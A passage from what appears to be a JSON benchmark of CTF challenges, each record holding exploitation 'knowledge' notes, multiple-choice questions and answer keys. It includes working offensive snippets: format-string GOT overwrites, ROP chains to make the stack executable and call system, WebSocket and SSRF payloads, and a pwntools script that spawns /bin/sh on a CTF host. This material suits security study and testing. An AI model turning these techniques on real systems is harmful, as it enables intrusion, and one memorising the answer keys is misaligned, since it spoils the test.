            "In a scenario where an application is vulnerable due to a `printf` function being called without a proper format string (e.g., `printf(user_input);`), which function from pwntools can be used to craft a payload that exploits this format string vulnerability to overwrite the Global Offset Table (GOT) entry of `puts` with the address of a `win` function?  - A. fmtstr_payload(offset,{binary.got.puts:binary.sym.win}) - B. fmt_payload(offset,{binary.got.puts:binary.sym.win}) - C. exploit_format_string({binary.got.puts:binary.sym.win}) - D. generate_fmtstr({binary.got.puts:binary.sym.win}) ",
            "If a binary executable seeds its random number generation using the current time as in `srand(time(NULL));` and later uses `rand()` to generate a value that must be guessed, what approach can be used to predict the output of `rand()` to exploit this condition?  - A. Using a brute force attack to guess the `rand()` output. - B. Capturing the binary's execution timestamp and using it to seed `rand()` in an external script to predict the output. - C. Using a script that seeds `rand()` with the current UTC time and immediately calls `rand()` to predict the output that the binary will generate. - D. Decompile the binary to directly extract the output of `rand()`. "
        ],
        "answer": [
            "A. fmtstr_payload(offset,{binary.got.puts:binary.sym.win})",
            "C. Using a script that seeds `rand()` with the current UTC time and immediately calls `rand()` to predict the output that the binary will generate."
        ]
    },
    {
        "name": "speedrun-4",
        "write_up": "dataset/raw/speedrun-4.md",
        "type": "web",
        "competition": [
            "BlueHens/2021",
            "https://ctftime.org/event/1298/tasks/"
        ],
        "score": 328,
        "max_score": 500,
        "difficulty": 0.656,
        "knowledge": [
            "When monitoring WebSocket traffic using tools like BurpSuite for a web-based CTF challenge, observe the outgoing messages for patterns, especially those indicating interactions with backend services such as database queries or specific endpoint requests. This might reveal how the application structures its requests, potentially allowing an attacker to craft malicious payloads targeting these endpoints.\n   - Example payload for querying a different endpoint: `{\"t\":\"d\",\"d\":{\"r\":1,\"a\":\"q\",\"b\":{\"p\":\"/desired_endpoint\",\"h\":\"\"}}}`",
            "In scenarios where the application is observed to make sequential or structured requests over WebSockets (e.g., querying database records), altering the payloads of these requests can lead to access to unauthorized or hidden information such as flag data. This can be particularly effective if the system does not validate or restrict access to sensitive endpoints or data thoroughly.\n   - Modified payload to access a flag: `{\"t\":\"d\",\"d\":{\"r\":1,\"a\":\"q\",\"b\":{\"p\":\"/flag\",\"h\":\"\"}}}`"
        ],
        "question": [
            "In the context of a web-based CTF challenge where an attacker is monitoring WebSocket traffic to identify backend interactions, which of the following payloads correctly adjusts the endpoint to query a different part of the application, based on observing outgoing WebSocket messages? - A. `{\"t\":\"x\",\"d\":{\"r\":1,\"a\":\"q\",\"b\":{\"p\":\"/unwanted_endpoint\",\"h\":\"\"}}}` - B. `{\"t\":\"d\",\"d\":{\"r\":1,\"a\":\"s\",\"b\":{\"p\":\"/desired_endpoint\"}}}` - C. `{\"t\":\"d\",\"d\":{\"r\":1,\"a\":\"q\",\"b\":{\"p\":\"/desired_endpoint\",\"h\":\"\"}}}` - D. `{\"t\":\"d\",\"d\":{\"r\":1,\"a\":\"q\",\"b\":{\"c\":\"/desired_endpoint\",\"h\":\"\"}}}`",
            "In an attack scenario during a web-based CTF challenge, after recognizing that an application makes sequential database or service queries over WebSockets, modifying the outgoing message can grant access to unauthorized data. Given the following original message for accessing book records, which modified payload would be the correct approach to attempt access to flag data? - A. `{\"t\":\"d\",\"f\":{\"r\":1,\"a\":\"q\",\"b\":{\"p\":\"/books\",\"h\":\"\"}}}` - B. `{\"t\":\"d\",\"d\":{\"r\":1,\"a\":\"n\",\"b\":{\"p\":\"/admin\",\"h\":\"\"}}}` - C. `{\"t\":\"g\",\"d\":{\"r\":1,\"a\":\"q\",\"b\":{\"p\":\"flag\"}}}` - D. `{\"t\":\"d\",\"d\":{\"r\":1,\"a\":\"q\",\"b\":{\"p\":\"/flag\",\"h\":\"\"}}}`"
        ],
        "answer": [
            "C.",
            "D."
        ]
    },
    {
        "name": "SPlaid Birch",
        "write_up": "dataset/raw/SPlaid Birch.md",
        "type": "misc",
        "competition": [
            "PlaidCTF/2019",
            "https://ctftime.org/event/743/tasks/"
        ],
        "score": 300,
        "max_score": 666,
        "difficulty": 0.45045045045045046,
        "knowledge": [
            "In pwnable challenges where the program involves complex data structures like trees and has an out-of-bounds (OOB) write vulnerability, crafting payloads that manipulate heap metadata or program control flow can be feasible. Specifically, if an application incorrectly processes tree node pointers, it's possible to forge a tree node structure on the heap to gain arbitrary code execution or leak information. Manipulating tree structures by exploiting OOB writes can allow for redirection of program execution flow or disclosure of sensitive information such as heap or libc addresses.",
            "For pwnable challenges involving C++ applications, understanding and exploiting Use-After-Free (UAF) vulnerabilities in conjunction with C++ specific structures such as `std::vector` and `std::basic_string` can lead to arbitrary code execution. This often involves manipulating object lifetimes and heap layout to trigger the vulnerability and gain control over the application. By carefully crafting payloads that exploit UAF vulnerabilities, it's possible to hijack control flow or corrupt memory to achieve code execution or leak sensitive data. This requires a deep understanding of the binary's heap management and the specifics of how C++ objects are allocated, initialized, copied, and destroyed."
        ],
        "question": [
            "In a scenario where an application incorrectly handles tree node pointers leading to an out-of-bounds write vulnerability, which of the following strategies could be most effective for exploiting this situation to either leak sensitive information or gain arbitrary code execution? - A. Writing arbitrary data past the end of a statically allocated buffer on the stack. - B. Forging a tree node structure in the heap memory to manipulate application logic or control flow. - C. Overflowing a local variable to overwrite a return address on the stack. - D. Injecting SQL commands to manipulate database queries. ",
            "When exploiting a Use-After-Free vulnerability in a C++ program that uses `std::vector` and `std::basic_string`, which of the following techniques is most likely to lead to arbitrary code execution or information leakage? - A. Using integer overflow to bypass array bounds checks. - B. Manually invoking the destructor of an object twice. - C. Manipulating object lifetimes and heap layout to control freed object's content or reuse. - D. Sending large amounts of data to overflow the program's input buffers. "
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "SSRF Me",
        "write_up": "dataset/raw/SSRF Me.md",
        "type": "This is a **web** challenge.",
        "competition": [
            "De1CTF/2019",
            "https://ctftime.org/event/843/tasks/"
        ],
        "score": 79,
        "max_score": 952,
        "difficulty": 0.08298319327731092,
        "knowledge": [
            "In SSRF challenges where the application logic separates actions but partially checks the action string enabling multiple actions to be executed with careful string manipulation, attackers can append or prepend the string to perform unintended actions. Specifically, if the system checks for an action by searching for a substring (`\"scan\"` in the action string) rather than matching the entire string, by crafting action values that contain the required substring along with additional text (`\"readscan\"`), both actions (`\"read\"` and `\"scan\"`) can be executed in a single request. This technique allows for bypassing restrictions or expected flow in web applications.\n    - Example payload: \n        - Action value: `\"readscan\"`\n        - Parameter value for generating sign: `\"flag.txtread\"`\n        - Final Parameter value: `\"flag.txt\"`",
            "SSRF (Server-Side Request Forgery) vulnerabilities can be exploited to perform local file inclusion (LFI) even when direct protocol prefixes such as `\"file://\"` are blocked. If the application appends user input (such as a file name) directly into file paths or URLs without proper validation, just using a file name (`\"flag.txt\"`) without a protocol can cause the application to access local files. This can be particularly useful when the application logic is designed to fetch resources based on URLs or file paths constructed with user input, and when direct access to file or gopher protocols is restricted.\n    - Example payload for reading local files bypassing protocol restrictions: `\"flag.txt\"` (without `\"file://\"` prefix)"
        ],
        "question": [
            "In a web application that performs operations based on user-specified actions, if the system checks for the execution of an action by searching for a substring rather than matching the entire action string, which of the following scenarios would exploit this behavior to perform unauthorized actions? - A. Using an exact match of the required action string to perform the intended action. - B. Appending additional text to the required action string to bypass restrictions and perform unintended actions. - C. Using completely unrelated action strings to trigger unexpected behaviors in the application. - D. Removing critical parts of the action string to prevent the action from being executed.",
            "When exploiting SSRF vulnerabilities to perform local file inclusion (LFI) in an application that blocks direct usage of the `\"file://\"` protocol, which approach can bypass this restriction without specifying a protocol? - A. Specifying the `\"http://\"` protocol instead of `\"file://\"` before the file name. - B. Including directory traversal sequences such as `\"../\"` before the file name. - C. Omitting the protocol prefix and directly using the file name in requests. - D. Encrypting the file name to obfuscate the request from security filters."
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "SSSP",
        "write_up": "dataset/raw/SSSP.md",
        "type": "crypto",
        "competition": [
            "HITCON/2017/Quals",
            "https://ctftime.org/event/485/tasks/"
        ],
        "score": 400,
        "max_score": 450,
        "difficulty": 0.8888888888888888,
        "knowledge": [
            "When dealing with challenges that utilize a predictable pseudorandom number generator (PRNG) like MT19937, it is possible to reconstruct the PRNG state incrementally from its outputs, especially if these outputs are part of the data used in the challenge (e.g., integers in a Subset sum problem). This approach can be refined by modeling the PRNG as an unbounded length array, where each entry contains all possible values at that point under certain constraints, thus gradually narrowing down the possibilities and recovering the full state. This technique is particularly applicable in scenarios where direct seed recovery is not feasible due to the use of secure RNG sources for initialization or when the outputs are not sequentially sorted.",
            "For Subset sum problems that become computationally infeasible due to the size or time constraints, one can apply heuristic approaches to reduce the problem's complexity. This involves identifying and removing a subset of the problem that has minimal impact on finding a correct solution but significantly lowers the computational effort required. Although this may reduce the probability of finding a valid solution in a single attempt, it allows for the application of a feasible brute-force approach by repeatedly attempting to solve the reduced problem until a solution is found. This method is beneficial in challenges where solving the entire problem set within the given constraints is impractical, and a small margin of error in the solution space is acceptable. \n\nSample heuristic reduction approach: In a challenge scenario with a Subset sum problem initially containing 63 numbers, reducing the problem size to 43 by omitting the last 20 numbers to meet time constraints."
        ],
        "question": [
            "In a cryptographic challenge where a PRNG's output - specifically MT19937, is partially revealed through a set of given data (e.g., integers in a Subset Sum problem), which of the following strategies can effectively reconstruct the PRNG's internal state over time? - A. Sequencing only the first 100 outputs and analyzing them for patterns. - B. Incrementally modeling the PRNG state as an unbounded length array, capturing all possible values at specific points based on output constraints, and narrowing down possibilities until the full state is recovered. - C. Using a single output to directly calculate the PRNG seed, without the need for gathering additional outputs or state information. - D. Ignoring the PRNG outputs entirely and focusing solely on cryptographic hash inversions to predict future outputs. ",
            "When faced with a Subset sum challenge that becomes unsolvable within the given computational or time limits, which heuristic strategy can be employed to feasibly approach the problem and progressively work towards a solution? - A. Double the amount of numbers in the problem set to increase the probability of finding matching subsets. - B. Randomly shuffle the numbers within the problem set in hope of revealing an easier pattern. - C. Identify and remove a carefully chosen subset of the problem that minimally impacts the correct solution's integrity but significantly reduces computational demands, thereby employing a probabilistic brute-force method for solving the reduced problem. - D. Multiply all integers in the subset by a fixed constant to simplify the sum calculations. "
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "Static and Dynamic",
        "write_up": "dataset/raw/Static and Dynamic.md",
        "type": "reverse",
        "competition": [
            "HacktivityCon/2020",
            "https://ctftime.org/event/1101/tasks/"
        ],
        "score": 100,
        "max_score": 400,
        "difficulty": 0.25,
        "knowledge": [
            "When conducting a buffer overflow attack in a challenge where NX (Non-Executable Stack) is enabled, and `mprotect()` or similar functions are present in the binary, the function can be used to change permissions of a memory region to executable. This allows for the injection and execution of shellcode on the stack. A ROP chain can be crafted to call `mprotect()` with appropriate arguments to make the stack executable, thereby bypassing NX protections. The specific scenario includes challenges where direct shellcode execution on the stack is initially prevented by NX. \n   \nExample payload components (abstracted for general understanding):\n   - Find gadgets: `pop_rdi_ret`, `pop_rsi_ret`, `pop_rdx_ret` for setting up the `mprotect()` arguments (memory address, size, protection mode).\n   - Use a gadget or function like `_dl_make_stack_executable` to change stack memory protection.\n   - Place shellcode on the stack or a known writable and now executable area.\n   - Jump to the shellcode using a `jmp rsp` gadget or similar.",
            "In scenarios where a binary has Partial RELRO enabled and exposes global variables like `__stack_prot`, one can directly manipulate these variables through a ROP chain to modify stack permissions or other security features. This approach is viable when specific symbols like `__stack_prot` are writable and the challenge binary has symbols or functions that interact with these global variables to alter memory protections or other security mechanisms.\n   \nExample abstracted explanation for modifying `__stack_prot`:\n   - Use ROP gadgets to write the desired value (`0x7` for RWX permissions) to `__stack_prot`.\n   - Call a function that uses the altered `__stack_prot` value to change memory protections, such as `_dl_make_stack_executable`.\n   - This bypasses the protection and allows executing custom shellcode placed on the stack or other manipulated memory regions."
        ],
        "question": [
            "In a buffer overflow challenge with NX enabled, preventing execution of shellcode on the stack, which sequence correctly outlines the steps to execute shellcode using `mprotect()` or a similar function?  - A. Execute shellcode directly, use `mprotect()` to mark the shellcode as non-executable, then find a `jmp rsp` gadget to jump back into the non-executable shellcode. - B. First, locate `pop_rdi_ret`, `pop_rsi_ret`, and `pop_rdx_ret` gadgets for setting up `mprotect()` arguments (memory address, size, protection mode), use a gadget or function like `_dl_make_stack_executable` to change stack memory protection, place the shellcode on the stack or a known writable area, and finally, jump to the shellcode. - C. Call `mprotect()` directly without setting up the correct arguments, bypass the need for gadgets, and expect the stack to become executable automatically. - D. Use ROP gadgets to directly jump into a pre-existing shellcode section without modifying any memory protections, disregarding NX protections. ",
            "When Partial RELRO is enabled and a binary provides access to global variables like `__stack_prot`, which action enables modifying stack permissions to execute arbitrary code through a ROP chain?  - A. Modify `__stack_prot` directly to execute code without using a ROP chain, ignoring Partial RELRO protections and not requiring any gadgets. - B. Use ROP gadgets to overwrite `__libc_start_main` to bypass all memory protections, including NX and stack canaries, without altering `__stack_prot`. - C. Immediately jump to `__stack_prot` address with a suitable ROP gadget, expecting the stack to auto-adjust permissions for code execution. - D. Use ROP gadgets to write the desired value (`0x7` for RWX permissions) to `__stack_prot`, call a function that uses the altered `__stack_prot` value to change memory protections, such as `_dl_make_stack_executable`, thereby bypassing the protection and enabling the execution of custom shellcode placed on the stack or modified memory regions. "
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "stbm",
        "write_up": "dataset/raw/stbm.md",
        "type": "pwn",
        "competition": [
            "Hackover/2018",
            "https://ctftime.org/event/689/tasks/"
        ],
        "score": 484,
        "max_score": 500,
        "difficulty": 0.968,
        "knowledge": [
            "In a challenge involving manipulation of function context or environment variables, examine the application's source code for functions that use dynamic execution methods such as `Kernel.system` or dynamic variable setting methods like `local_variable_set`. If you can control the input or parameters that interact with these methods, you can potentially execute arbitrary commands or manipulate the application behavior. This is especially relevant in scenarios where the application dynamically executes commands based on user input or parameters.\n   - Example payload: To execute a shell command, if you find a method that allows injecting command via parameters (and you can control these parameters), you might be able to execute: `update test context=Kernel checksum=555 password=lol` followed by `system '/bin/sh'`.",
            "When faced with a challenge where direct command execution doesn't work as expected (e.g., hangs because it awaits further input or doesn't interpret the command correctly), consider utilizing a shell to bypass the limitation. Dropping into a shell (`/bin/sh`) can provide a direct interface to the system, allowing for more complex interactions like reading files directly or executing a series of commands that wouldn't be possible through the initially exposed interface.\n   - Example to read a file directly when command execution is limited: First, inject into a context that allows executing system commands, then use `system '/bin/sh'` to drop into a shell. From the shell, you can directly `cat` files or execute other commands without the limitations imposed by the original application's command parsing.\n   - Python automation snippet with `pwntools`:\n     ```python\n     from pwn import *\n\n     r = remote('stbm.ctf.hackover.de', 1337)\n\n     r.send(\"switch_module FirmwareCommands\\n\")  \n     r.send(\"update test context=Kernel checksum=555 password=lol\\n\")  \n     r.send(\"system /bin/sh\\n\")  \n     r.interactive()\n     ```"
        ],
        "question": [
            "In the scenario of updating firmware in a Ruby application, what method allowed for arbitrary command execution by manipulating parameters sent to a firmware update function? - A. Using `Kernel.exec` with specially crafted parameters. - B. Manipulating the `local_variable_set` method to alter the execution context. - C. Directly calling `File.read` with manipulated parameters. - D. Encoding the firmware update commands using Base64. ",
            "When attempting to read a file (e.g., flag.txt) via command execution in a Ruby application and facing issues with the command hanging, which approach provides an effective workaround? - A. Using `Digest::MD5.hexdigest` to bypass command restrictions. - B. Redirecting output of the file read command to a web server. - C. Dropping into a shell using `system '/bin/sh'` for direct file interaction. - D. Utilizing the `File.open` method with dynamic filename generation. "
        ],
        "answer": [
            "B. Manipulating the `local_variable_set` method to alter the execution context.",
            "C. Dropping into a shell using `system '/bin/sh'` for direct file interaction."
        ]
    },
    {
        "name": "steg0",
        "write_up": "dataset/raw/steg0.md",
        "type": "This is a **forensics** challenge.",
        "competition": [
            "Hack.lu/2018",
            "https://ctftime.org/event/699/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When analyzing a zip file for potential hidden or encrypted data, the usage of tools like GNU strings can be an effective methodology for extracting plaintext data or comments that may contain clues or direct information related to the challenge. These elements can sometimes be overlooked when focusing solely on the file's main content. This approach is beneficial in scenarios where the challenge includes encrypted files or data obfuscation.",
            "The existence of a ZIP file comment (\"there_is_no_flag\") demonstrates the potential use of file metadata or appended data segments as a vector for hiding messages or red herrings. This method can be applied in challenges where the solution seems obscured by encryption or when the file appears to contain random data. Attention to all components of a file, including metadata and file comments, is crucial in uncovering all possible hints or misdirections implemented by challenge designers."
        ],
        "question": [
            "When examining an encrypted zip file for hidden data, why might the use of GNU strings be considered an effective technique? - A. It enables the alteration of encrypted file contents without needing the password. - B. It automates the decryption process by identifying weak encryption algorithms. - C. It can extract readable strings from binary data, potentially revealing plaintext messages or file comments. - D. It repairs corrupted zip files, making it easier to access hidden data.",
            "What does the discovery of a ZIP file comment like \"there_is_no_flag\" indicate in the context of cybersecurity challenges? - A. It confirms the successful decryption of the file's content. - B. It demonstrates the use of file metadata or comments as a method for hiding messages or diversions. - C. It suggests that the file contains an encrypted message that is crucial for the challenge. - D. It indicates the presence of malware embedded within the zip file."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "stegasaurus scratch",
        "write_up": "dataset/raw/stegasaurus scratch.md",
        "type": "The type of CTF challenges described in the write-up is **crypto**.",
        "competition": [
            "PlaidCTF/2020",
            "https://ctftime.org/event/936/tasks/"
        ],
        "score": 150,
        "max_score": 550,
        "difficulty": 0.2727272727272727,
        "knowledge": [
            "For challenges involving reconstructing a sequence or identifying a missing element without direct communication, utilizing mathematical properties of the sequence can be effective. Specifically, when the sequence involves a limited range of numbers and a restricted number of elements, encoding the missing element's information by combining permuted elements and a calculated value based on known constraints allows for efficient data transmission without explicit communication. For example, in scenarios where elements are from a fixed numerical range and one is missing, representing the missing element with a combination of its possible quotient within the range and its remainder or positional value in a sorted version of the sequence can streamline the identification process.",
            "In challenges that involve arrays with a specific composition of elements and the task is to deduce the original arrangement of these elements based on partial information, the solution can hinge on identifying patterns or rules that must hold true in the array's construction. For example, when an array is composed of a fixed number of different elements in a pattern (like a fixed number of 1s and 2s), focusing on the inevitable interaction between these elements (such as a 1 must be adjacent to a 2) allows for the reconstruction of the original array by systematically applying this rule to deduce the positions of elements based on partial cues provided, treating the array as a cyclical entity to ensure all scenarios are covered."
        ],
        "question": [
            "In a cryptography challenge, Alice and Bob wish to communicate a number selected from a limited range without direct message exchange. They decide to use a mathematical property to encode this number. Alice discards one number from a set of 8 random numbers (ranging from 0 to 40000), arranges the remaining numbers in a certain way, and sends this data to Bob. Bob then decodes this arrangement to find the discarded number. Which method best describes how they could achieve this? - A. Using the sum of the remaining numbers as a code to represent the discarded number. - B. Encoding the discarded number as the product of the remaining numbers and sending the quotient and remainder as the encoded message. - C. Representing the discarded number as `discarded = 8*p + reminder`, where `p` is encoded in the permutation of the remaining numbers, and `reminder` is their positional value in a sorted array. - D. Converting the entire sequence into a binary string where each bit represents the presence or absence of numbers in the sequence, then sending this string to Bob. ",
            "In a challenge, the objective is to reconstruct an original array consisting of exactly 64 1's and 32 2's based on limited information shared between two parties: Alice and Bob. Alice can send Bob information about the positions of 32 specific 1's from the array. To deduce the original array's structure, Bob needs to apply a systematic approach based on a fundamental understanding of the array's composition. What strategy best encapsulates the underlying principle Bob must use to solve this puzzle? - A. Count the frequency of 1's and 2's received and fill in the blanks randomly, assuming that randomness will match the original structure eventually. - B. Given the information about positions of some 1's, Bob places 2's in the remaining spaces, assuming that 1's and 2's are distributed evenly. - C. Focus on the rule that a 1 must always be adjacent to a 2, and apply this iteratively to reconstruct the array by placing 2's next to communicated 1's and adjusting the array in a cyclical manner. - D. Create a binary tree where each node represents a 1 or a 2 and use depth-first search to explore all possible arrays that fit the initial set of positions shared by Alice. "
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "Stellar Radiation 2",
        "write_up": "dataset/raw/Stellar Radiation 2.md",
        "type": "web",
        "competition": [
            "LedgerDonjon/2021",
            "https://ctftime.org/event/1516/tasks/"
        ],
        "score": 200,
        "max_score": 400,
        "difficulty": 0.5,
        "knowledge": [
            "When faced with a challenge that involves creating a valid message for cryptographic operations (e.g., SHA-256 hash) where the output must meet specific criteria (such as being completely printable ASCII characters), one can utilize GPUs to efficiently brute force a wide range of inputs. This approach takes advantage of the massive parallel processing power of GPUs to perform a high number of hash calculations quickly, iterating through possible inputs until finding one that produces a hash meeting the criteria. This is particularly useful in situations where the probability of success for any given input is extremely low, as in the case where the output must consist only of printable characters.",
            "In a challenge that requires interacting with a blockchain or digital ledger technology (such as Stellar in this case), where the task involves generating transactions that must be signed with a secret key, an alternative approach can be used if direct access to sign transactions is not permitted. If the challenge allows for sending a short, arbitrary piece of data to be signed (under certain conditions, like length or character restrictions), one can craft a payload that, when signed, fulfills the requirements of the blockchain transaction. This involves careful preparation of the data to be signed to ensure it is a valid part of a transaction according to the blockchain's protocol, leveraging any server-side functionality that signs data on behalf of the user. \n\nSample Payload for signing a transaction with specific criteria:\n```\ncurl -X POST http://stellar-radiation.donjon-ctf.io:25520/publickey -d 'proof=XM>iUQ9i9~b[*nT{x3!<Rpt%20%0C@o0XBj@'\n```\nThis sends a request to a server endpoint to sign a piece of data (`proof`) that, when signed, can be used as part of a blockchain transaction. The signed data is then utilized to fulfill the challenge's requirement, in this case, by embedding it within a Stellar transaction and submitting it for validation."
        ],
        "question": [
            "In a cryptographic challenge where the goal is to find a SHA-256 hash output that consists only of printable ASCII characters, which of the following computational approaches is best suited to efficiently search for a valid hash output? - A. Using a single CPU core to sequentially test hash inputs. - B. Utilizing a quantum computer to exploit quantum parallelism. - C. Employing a distributed network of smartphones to parallelize the computation. - D. Leveraging the parallel processing capabilities of a GPU for brute-forcing hash inputs. ",
            "In a scenario where you need to submit a transaction to a Stellar blockchain without direct access to sign it with the secret key, but you can send a short piece of data to be signed by the server, which approach can be used to ensure the signed data fulfills the transaction's requirements? - A. Encrypt the transaction data with the server's public key and send it for signing. - B. Send a random piece of data for signing, hoping it will accidentally match the transaction's signature needs. - C. Carefully prepare a piece of data that meets character and length restrictions for signing by the server, which can then be used as part of the blockchain transaction. - D. Use a pre-signed blank transaction template and send it for server validation without modifications. "
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "Stephanie Wehner",
        "write_up": "dataset/raw/Stephanie Wehner.md",
        "type": "crypto",
        "competition": [
            "CyberHeroines/2023",
            "https://ctftime.org/event/2054/tasks/"
        ],
        "score": 300,
        "max_score": 400,
        "difficulty": 0.75,
        "knowledge": [
            "When analyzing a memory dump challenge, especially when investigating application behavior such as notepad, using tools like Volatility for memory analysis can identify processes and extract relevant information. To filter for specific applications, commands such as `python3 vol.py -f [memory_dump_file] windows.pslist.PsList | Select-String [application_name]` can be utilized. Here, the goal is to list all running processes and filter for the application of interest (e.g., notepad) to obtain its PID. This approach allows for targeted investigation within memory dumps. \n   \n    Example command: `python3 vol.py -f memory_dump.vmem windows.pslist.PsList | Select-String notepad`",
            "To extract readable strings from process memory dumps and identify potentially hidden or disguised content (such as a flag), the `strings` utility can be combined with filtering commands like `grep` or `Select-String` in a Unix-like or Windows environment, respectively. This can be particularly effective in scenarios where direct searches may lead to false leads or decoy data. Adding context to search results (e.g., with `-B` option in `grep` to show lines before the match) can reveal additional clues or the actual flag hidden near misleading or dummy flags.\n\n    Example command: `strings -e l pid2452.dmp | grep \"chctf\" -B 10`"
        ],
        "question": [
            "When attempting to identify the Process ID (PID) of the notepad application using Volatility in a memory dump challenge, which command should be correctly utilized to filter out the specific application's process information?  - A. `python3 vol.py -f memory_dump.vmem linux.pslist | grep notepad` - B. `python3 vol.py -f memory_dump.vmem windows.pslist.PsList | Select-String notepad` - C. `vol.py -f memory_dump.vmem | grep \"notepad.exe\"` - D. `python vol.py -list notepad -f memory_dump.vmem` ",
            "To find hidden or disguised content, such as a flag, within a process memory dump using the `strings` utility, which approach is most effective for including context around potential false flags or misleading information?  - A. `strings pid2452.dmp | grep \"chctf\"` - B. `strings -a pid2452.dmp | findstr \"chctf\"` - C. `cat pid2452.dmp | grep -A 10 \"chctf\"` - D. `strings -e l pid2452.dmp | grep \"chctf\" -B 10` "
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "stonks",
        "write_up": "dataset/raw/stonks.md",
        "type": "pwn",
        "competition": [
            "HSCTF/2021",
            "https://ctftime.org/event/1264/tasks/"
        ],
        "score": 391,
        "max_score": 493,
        "difficulty": 0.7931034482758621,
        "knowledge": [
            "When encountering a straightforward buffer overflow vulnerability in a CTF challenge, tools like [autorop](https://github.com/mariuszskon/autorop) can automate the exploitation process by generating the necessary code to gain access to a shell or execute arbitrary code. These tools handle typical exploit stages such as finding the offset to the return address, leaking function addresses to bypass ASLR, searching for a suitable libc version based on leaked addresses, and executing a system shell. This approach is particularly beneficial for beginners or those who prefer a quick exploitation route.",
            "In scenarios where manual identification of buffer overflow vulnerability offsets and gadget chains is infeasible or too time-consuming, leveraging gadget finding and ROP (Return-Oriented Programming) chain constructing features of automated tools can significantly expedite the exploitation process. After establishing a connection to the vulnerable service, these tools can dynamically analyze the binary to identify useful gadgets, calculate buffer overflow offsets, leak function addresses for libc version identification, and finally, automate the ROP chain creation to spawn a shell. This method hinges on the availability of partial RELRO, no canary, NX enabled, no PIE, or similar binary protections that don't completely mitigate buffer overflow exploitation but do require a precise ROP chain to exploit.\n\nExample payload (constructed by the automated tool, specific bytes and addresses may differ depending on the scenario):\n```\n0x0000:         0x40101a ret  \n0x0008:         0x401363 pop rdi; ret  \n0x0010:         0x404018 [arg0] rdi = got.puts  \n0x0018:         0x401094 puts  \n0x0020:         0x40101a ret  \n0x0028:         0x401363 pop rdi; ret  \n0x0030:   0x7f8750a425aa [arg0] rdi = 140219150247338  \n0x0038:         0x4010a4 system  \n```\nThis payload sequence demonstrates the process of leaking addresses (such as the address of `puts`) and then using these addresses along with other gadgets to call `system(\"/bin/sh\")` for an interactive shell."
        ],
        "question": [
            "In the context of exploiting a buffer overflow vulnerability in a CTF challenge, which of the following stages is NOT typically automated by an exploitation tool like autorop?  - A. Calculating the exact amount of padding needed to overwrite the return address - B. Automatically downloading and installing security updates for the binary - C. Identifying and leaking function addresses to bypass address space layout randomization (ASLR) - D. Searching for and identifying a suitable version of libc based on leaked addresses ",
            "For a successful buffer overflow exploit in a scenario with partial RELRO, no canary, NX enabled, and no PIE, which of the following statements best describes the utility of leveraging gadget finding and ROP chain constructing features of automated tools?  - A. These tools are primarily used to enforce stricter binary protections such as Full RELRO and PIE. - B. They negate the need for understanding the underlying binary or exploitation techniques by fully automating the CTF challenge. - C. Automated tools can dynamically analyze the binary, identify useful gadgets, calculate buffer overflow offsets, and automate the ROP chain creation to spawn a shell. - D. These features are only useful for creating payloads that disable NX and enable PIE, thus making the binary less secure. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "storagespace",
        "write_up": "dataset/raw/storagespace.md",
        "type": "crypto",
        "competition": [
            "FacebookCTF/2019",
            "https://ctftime.org/event/781/tasks/"
        ],
        "score": 919,
        "max_score": 1000,
        "difficulty": 0.919,
        "knowledge": [
            "When dealing with cryptographic challenges, especially those involving ECC (Elliptic Curve Cryptography), an important vulnerability to exploit is the small order of the curve. If the curve order is sufficiently small, it allows for the efficient solution of the ECDLP (Elliptic Curve Discrete Logarithm Problem) using mathematical tools or libraries such as Sagemath, which can utilize algorithms like Pohlig-Hellman. This method can be particularly useful in situations where you have the public key and you need to find the corresponding private key.",
            "In a scenario requiring interaction with a service for cryptographic operations, it is beneficial to script the process of command generation, signing, and communication with the service. Automating the signing of messages and the retrieval of cryptographic parameters (e.g., curve specifications and public keys) simplifies the process of exploiting vulnerabilities and executing attacks. Python, along with libraries for cryptographic calculations and network communication, such as PyCryptodome and sockets respectively, can be effectively used for this purpose.\n\nExample of automating ECC calculations and network communication:\n```python\nfrom sage.all import *\n# Pseudocode for solving ECDLP and interacting with a remote service\n# Initialize curve parameters a, b, p, G, H\nE = EllipticCurve(GF(p), [a, b])\nG = E(gen_x, gen_y)\nH = E(pub_x, pub_y)\n\n# Solve for the private key using ECDLP\nkey = discrete_log(H, G, operation='+')\n\n# Construct and sign the challenge message\nmessage = \"flag(name=file_name)\"  # Assuming file_name is known\n# Sign the message using the obtained key (simplified example)\nr, s = sign_message(message, key)\n\n# Send the signed message to the service\nsigned_message = {\"command\": \"flag\", \"params\": {\"name\": \"file_name\"}, \"signature\": {\"r\": r, \"s\": s}}\nsend_to_service(signed_message)\n```\nThis pseudocode showcases how to script the solving of ECDLP, signing of a message, and interaction with a remote service, applying general techniques from the given CTF challenge write-up."
        ],
        "question": [
            "When attempting to exploit a vulnerability due to the small order of an elliptic curve in a cryptographic challenge, which method is appropriate for solving the Elliptic Curve Discrete Logarithm Problem (ECDLP) when you have the curve's parameters and the public key, aiming to find the corresponding private key?  - A. Brute force all possible private keys until one matches the public key. - B. Utilize an algorithm like Pohlig-Hellman, possibly through a mathematical tool like Sagemath, to solve ECDLP efficiently. - C. Use RSA decryption algorithm directly on the public key to reverse-engineer the private key. - D. Encrypt a known plaintext with the public key and decrypt it with all possible private keys until one decrypts it correctly. ",
            "In scenarios that involve interacting with a secure flag storage system via JSON-based commands for cryptographic operations, which approach facilitates the automation of key cryptographic steps, such as generating commands, signing messages, and communicating with the service?  - A. Manually performing each step and using telnet for communication with the service. - B. Utilizing HTML and CSS to design a web interface for manual input of cryptographic parameters. - C. Employing Python scripts with cryptographic libraries for ECC calculations and network libraries for sending and receiving JSON commands, thereby automating the process. - D. Writing Bash scripts to generate and decode QR codes for each step of the cryptographic process and scanning them with a mobile device to send commands. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "StrangeBytes",
        "write_up": "dataset/raw/StrangeBytes.md",
        "type": "crypto",
        "competition": [
            "DanteCTF/2023",
